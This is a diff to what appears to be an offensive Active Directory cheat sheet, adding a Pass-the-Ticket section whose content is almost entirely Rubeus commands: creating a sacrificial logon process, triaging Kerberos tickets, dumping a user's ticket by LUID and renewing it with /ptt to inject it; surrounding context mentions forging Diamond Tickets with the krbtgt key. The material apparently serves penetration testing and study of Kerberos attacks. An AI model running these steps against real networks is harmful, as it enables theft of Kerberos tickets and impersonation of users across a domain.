@@ -229,6 +229,22 @@ Mitigations:
 ## Pass the Ticket(PtT)
 > :warning: Make sure to create a sacrificial process to avoid overwriting an existing logon sessions Kerberos ticket. If SERVICE loses it's ticket, it will not get another one until a reboot
 
+* Create a sacrificial process
+```powershell
+.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+* Read the existing Tickets using Rubeus
+```powershell
+.\Rubeus.exe triage
+```
+* Extract the ticket for a **user** from the krbtgt service
+```powershell
+.\Rubeus.exe dump /luid:<luid> /service:<service> /nowrap
+```
+* Use the Rubeus Renew function to get a TGT
+```cmd
+Rubeus.exe renew /ticket:<ticket> /ptt
+```
 ## Pass-the-Ticket Diamond Tickets
 
 > Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key
